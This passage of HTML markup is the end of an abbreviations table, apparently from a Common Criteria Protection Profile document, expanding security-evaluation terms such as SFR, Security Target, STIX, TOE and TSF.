class="term" id="abbr_PP-Module"><abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr></span></td><td><span id="long_abbr_PP-Module">Protection Profile Module</span></td></tr><tr><td><span class="term" id="abbr_RBG"><abbr class="dyn-abbr"><a href="#abbr_RBG">RBG</a></abbr></span></td><td><span id="long_abbr_RBG">Random Bit Generator</span></td></tr><tr><td><span class="term" id="abbr_SAR"><abbr class="dyn-abbr"><a href="#abbr_SAR">SAR</a></abbr></span></td><td><span id="long_abbr_SAR">Security Assurance Requirement</span></td></tr><tr><td><span class="term" id="abbr_SFR"><abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr></span></td><td><span id="long_abbr_SFR">Security Functional Requirement</span></td></tr><tr><td><span class="term" id="abbr_ST"><abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr></span></td><td><span id="long_abbr_ST">Security Target</span></td></tr><tr><td><span class="term" id="abbr_STIX"><abbr class="dyn-abbr"><a href="#abbr_STIX">STIX</a></abbr></span></td><td><span id="long_abbr_STIX">Structured Threat Information eXpression</span></td></tr><tr><td><span class="term" id="abbr_TLS"><abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr></span></td><td><span id="long_abbr_TLS">Transport Layer Security</span></td></tr><tr><td><span class="term" id="abbr_TOE"><abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr></span></td><td><span id="long_abbr_TOE">Target of Evaluation</span></td></tr><tr><td><span class="term" id="abbr_TSF"><abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr></span></td><td><span id="long_abbr_TSF"><abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> Security Functionality</span></td></tr><tr><td><span class="term" id="abbr_TSS"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></span></td><td><span id="long_abbr_TSS"><abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> Summary Specification</span></td></tr></table></body></html>
